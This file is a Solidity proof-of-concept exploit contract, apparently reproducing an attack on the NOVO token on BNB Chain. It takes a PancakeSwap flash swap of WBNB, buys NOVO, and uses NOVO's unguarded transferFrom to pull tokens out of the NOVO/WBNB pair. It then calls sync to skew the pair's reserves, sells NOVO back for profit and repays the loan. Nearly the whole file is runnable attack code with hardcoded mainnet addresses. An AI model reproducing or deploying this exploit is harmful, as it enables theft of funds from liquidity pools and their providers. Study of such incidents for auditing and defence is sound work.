// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";


contract novo_poc{
    address public constant KIMO_WBNB = 0xEeBc161437FA948AAb99383142564160c92D2974;
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // address public NOVO_proxy = 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1;
    address public constant NOVO_token = 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333;
    address public constant NOVO_WBNB = 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D;

    address public pancake_router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;            //pancake

    receive() payable external{}

    function pancake_swap() public{
        console.log("start pancake flash swap...");

        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(KIMO_WBNB).getReserves();
        console.log("KIMO_WBNB pair pool first reserve0 and reserve1 : ", reserve0, reserve1);

        bytes memory data = bytes("flash swap");
        uint256 borrowAmount0 = 0;
        uint256 borrowAmount1 = 172 * 10 ** 17;
        UniswapV2Pair(KIMO_WBNB).swap(borrowAmount0, borrowAmount1, address(this), data);

        console.log("7xxxxx flash swap has returned..., I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }

    function pancakeCall(address _account, uint256 _amount0, uint256 _amount1, bytes memory _data) public{
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));

        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(NOVO_WBNB).getReserves();
        console.log("NOVO_WBNB_pair reserve0 and reserve1 : ", reserve0, reserve1);

        console.log("1xxxxx NOVO_token has NOVO amount: ", IERC20(NOVO_token).balanceOf(NOVO_token));        //353,303,644,762,273 

        IERC20(WBNB).approve(pancake_router, type(uint).max);

        uint amountIn = IERC20(WBNB).balanceOf(address(this));
        uint amountOutMin = 1;
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = NOVO_token;

        UniswapV2Pair(pancake_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, amountOutMin, path, address(this), block.timestamp);
        console.log("2xxxxx swapExactTokensForTokensSupportingFeeOnTransferTokens...");

        (uint256 reserve00, uint256 reserve11, ) = UniswapV2Pair(NOVO_WBNB).getReserves();
        console.log("NOVO_WBNB_pair reserve0 and reserve1 : ", reserve00, reserve11);
        console.log("3xxxxx NOVO_token has NOVO amount: ", IERC20(NOVO_token).balanceOf(NOVO_token));

        IERC20(NOVO_token).transferFrom(NOVO_WBNB, NOVO_token, 113951614762384370);
        (uint256 reserve000, uint256 reserve111, ) = UniswapV2Pair(NOVO_WBNB).getReserves();
        console.log("4xxxxx after tansferfrom NOVO_WBNB_pair reserve0 and reserve1 : ", reserve000, reserve111);
        console.log("4xxxxx after tansferfrom NOVO_token has NOVO amount: ", IERC20(NOVO_token).balanceOf(NOVO_token));

        UniswapV2Pair(NOVO_WBNB).sync();
        uint256 my_NOVO_balance = IERC20(NOVO_token).balanceOf(address(this));
        console.log("5xxxxx after sync I have NOVO", my_NOVO_balance);

        IERC20(NOVO_token).approve(pancake_router, type(uint).max);

        uint amountIn1 = my_NOVO_balance;
        uint amountOutMin1 = 1;
        address[] memory path1 = new address[](2);
        path1[0] = NOVO_token;
        path1[1] = WBNB;

        UniswapV2Pair(pancake_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn1, amountOutMin1, path1, address(this), block.timestamp);
        console.log("6xxxxx swapExactTokensForTokensSupportingFeeOnTransferTokens...");
        console.log("NOVO_token has NOVO amount: ", IERC20(NOVO_token).balanceOf(NOVO_token));
        console.log("-------------- now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));

        IERC20(WBNB).transfer(KIMO_WBNB, 17244720000000000000);
    }


}